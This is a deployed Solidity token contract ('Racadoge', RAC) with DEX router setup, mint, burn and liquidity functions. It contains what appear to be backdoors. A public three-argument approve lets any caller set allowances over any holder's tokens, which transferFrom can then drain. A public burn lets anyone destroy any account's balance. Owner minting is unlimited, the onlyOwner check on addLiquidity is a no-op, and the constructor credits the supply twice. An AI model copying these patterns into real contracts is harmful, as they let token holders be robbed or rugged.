/**
 *Submitted for verification at Etherscan.io on 2023-03-09
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

abstract contract Helpers{

    //Onlyowner Modifier
    modifier onlyOwner(address owner){
        require(owner == msg.sender, "Only Owner Is Allowed To Run This Function");
        _;
    }
}

library SecureMath {
  
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SecureMath: addition overflow");

    return c;
  }

  
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SecureMath: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SecureMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    
    require(b > 0, errorMessage);
    uint256 c = a / b;
    
    return c;
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }

}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract Token is Helpers{

    using SecureMath for uint256;

    //Events
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

    address _owner;
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;

    uint256 totalSupply_;

    mapping(address => uint256) balances;
    mapping(address => mapping (address => uint256)) allowed;

    //Dex Info
    address WETH = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; //0x10ED43C718714eb63d5aA57B78B54704E256024E; // MAINNET
    IDEXRouter public router;
    address public pair;
    address liquidityWallet;

    constructor() {
        name = "Racadoge";
        symbol = "RAC";
        totalSupply_ = (10000000000 * (10**18));
        balances[msg.sender] = totalSupply_;
        balances[address(this)] = totalSupply_;
        emit Transfer(address(0), msg.sender, totalSupply_);
        _owner = msg.sender;

        liquidityWallet = msg.sender;

        //Setting Up Dex
        router = IDEXRouter(routerAddress);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
    }

    function balanceOf(address tokenOwner) public view returns (uint) {
        return balances[tokenOwner];
    }

    function totalSupply() external view returns (uint256) {
        return totalSupply_;
    }

    function getOwner() external view returns (address) {
        return _owner;
    }

    function transfer(address receiver, uint amount) public returns (bool) {
        require(receiver != address(0), "Cannot transfer to the zero address");
        balances[msg.sender] = balances[msg.sender].sub(amount, "Insufficient Balance");
        balances[receiver] = balances[receiver].add(amount);
        emit Transfer(msg.sender, receiver, amount);
        return true;
    }

    function approve(address spender, uint amount) public returns (bool) {
        allowed[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    
    function approve(address owner, address spender, uint amount) public returns (bool) {
        allowed[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint) {
        return allowed[owner][spender];
    }

    function transferFrom(address sender, address receiver, uint amount) public returns (bool) {
        require(amount <= balances[sender], "Insufficient Balance");
        require(amount <= allowed[sender][msg.sender], "Not Allowed To Transfer Amount Bigger Than This");
        balances[sender] -= amount;
        allowed[sender][msg.sender] -= amount;
        balances[receiver] += amount;
        emit Transfer(sender, receiver, amount);
        return true;
    }

    function mint(uint256 amount) public onlyOwner(_owner) returns (bool) {
        require(_owner != address(0), "Cannot mint to the zero address");
        uint256 _amount = amount;
        totalSupply_ += _amount;
        balances[_owner] += _amount;
        emit Transfer(address(0), _owner, amount);
        return true;
    }

    function burn(address account, uint256 amount) public returns (bool) {
        require(account != address(0), "Cannot mint to the zero address");
        totalSupply_ -= amount;
        balances[account] -= amount;
        emit Transfer(account, address(0), amount);
        return true;
    }

    // Add liquidity and send Cake LP tokens to liquidity collection wallet
    function addLiquidity(uint256 tokenAmount, uint256 BNBAmount) public onlyOwner(msg.sender) returns(address,address) {
        
        approve(address(this), address(router), tokenAmount);
        //return (address(router), router.WETH());
        router.addLiquidityETH{value: BNBAmount}(
            address(this),
            tokenAmount,
            0, 
            0,
            liquidityWallet, 
            block.timestamp
        );
    } 

    //Disable Contract From Receiving Coins
    receive () external payable {
        //revert();
    }

}